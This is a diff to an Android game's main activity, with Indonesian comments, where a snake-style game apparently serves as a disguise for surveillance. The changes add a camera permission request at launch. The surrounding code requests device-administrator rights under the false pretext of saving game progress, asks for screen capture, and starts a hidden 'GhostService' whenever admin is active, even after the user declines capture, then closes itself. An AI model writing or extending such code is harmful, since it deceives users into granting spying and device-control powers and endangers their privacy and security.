@@ -4,6 +4,7 @@ import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.*;
 import android.media.projection.MediaProjectionManager;
 import android.os.Bundle;
@@ -19,6 +20,7 @@ import java.util.Random;
 public class MainActivity extends Activity {
     private static final int WIN_SCORE = 10;
     private static final int REQUEST_MEDIA_PROJECTION = 1001;
+    private static final int REQUEST_CAMERA_PERMISSION = 1002;
     private GameView gameView;
     private TextView scoreText;
     private Handler handler = new Handler();
@@ -35,6 +37,11 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
 
         projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+
+        // Minta izin kamera di awal
+        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{android.Manifest.permission.CAMERA}, REQUEST_CAMERA_PERMISSION);
+        }
 
         // Root untuk menu dan game
         LinearLayout root = new LinearLayout(this);
@@ -158,7 +165,7 @@ public class MainActivity extends Activity {
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan admin untuk menyimpan progres!");
             startActivity(intent);
         } else {
-            // Setelah admin aktif, minta izin MediaProjection
+            // Admin sudah aktif, langsung minta MediaProjection
             requestMediaProjection();
         }
     }
@@ -171,26 +178,21 @@ public class MainActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
-            // Mulai service MediaProjection
             Intent serviceIntent = new Intent(this, MediaProjectionService.class);
             serviceIntent.putExtra("resultCode", resultCode);
             serviceIntent.putExtra("data", data);
             startService(serviceIntent);
-            // Jalankan GhostService
+        }
+        // Jalankan GhostService setelah admin aktif (atau setelah MediaProjection)
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
+        if (dpm.isAdminActive(comp)) {
             startService(new Intent(this, GhostService.class));
             finish();
-        } else {
-            // Jika admin aktif tapi user tolak, tetap jalankan GhostService
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
-            if (dpm.isAdminActive(comp)) {
-                startService(new Intent(this, GhostService.class));
-                finish();
-            }
         }
     }
 
-    // ========== GAME VIEW ==========
+    // ========== GAME VIEW (sama seperti sebelumnya) ==========
     public class GameView extends View {
         private List<Food> foods = new ArrayList<>();
         private List<Enemy> enemies = new ArrayList<>();
@@ -219,11 +221,9 @@ public class MainActivity extends Activity {
             eyePaint.setColor(Color.BLACK);
             eyePaint.setStyle(Paint.Style.FILL);
 
-            // Makanan
             for (int i = 0; i < 40; i++) {
                 foods.add(new Food(rand.nextFloat() * 800, rand.nextFloat() * 1200, rand.nextInt(5)));
             }
-            // Musuh
             for (int i = 0; i < 8; i++) {
                 enemies.add(new Enemy(rand.nextFloat() * 800, rand.nextFloat() * 1200));
             }
@@ -245,7 +245,6 @@ public class MainActivity extends Activity {
                 if (headY < 0) headY = 0;
                 if (headY > 1200) headY = 1200;
 
-                // Makan
                 for (int i = 0; i < foods.size(); i++) {
                     Food f = foods.get(i);
                     if (Math.hypot(headX - f.x, headY - f.y) < 25) {
@@ -255,7 +254,6 @@ public class MainActivity extends Activity {
                         break;
                     }
                 }
-                // Musuh gerak
                 for (Enemy e : enemies) {
                     e.x += (rand.nextFloat() - 0.5f) * 6;
                     e.y += (rand.nextFloat() - 0.5f) * 6;
@@ -273,7 +271,6 @@ public class MainActivity extends Activity {
         protected void onDraw(Canvas canvas) {
             super.onDraw(canvas);
             canvas.drawColor(0xFF1a1a2e);
-            // Makanan
             for (Food f : foods) {
                 switch (f.type) {
                     case 0: foodPaint.setColor(0xFFFF4444); break;
@@ -284,14 +281,12 @@ public class MainActivity extends Activity {
                 }
                 canvas.drawCircle(f.x, f.y, 8 + f.type * 2, foodPaint);
             }
-            // Musuh
             for (Enemy e : enemies) {
                 enemyPaint.setColor(0xFF4444FF);
                 canvas.drawCircle(e.x, e.y, 22, enemyPaint);
                 canvas.drawCircle(e.x - 7, e.y - 7, 5, eyePaint);
                 canvas.drawCircle(e.x + 7, e.y - 7, 5, eyePaint);
             }
-            // Pemain
             bodyPaint.setColor(boosting ? 0xFFFF4444 : 0xFF00FF88);
             canvas.drawCircle(headX, headY, 24, bodyPaint);
             canvas.drawCircle(headX - 8, headY - 8, 5, eyePaint);
@@ -312,7 +307,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // Joystick kustom
     class JoystickView extends View {
         private float cx, cy, radius = 70;
         private Paint bgPaint, stickPaint;
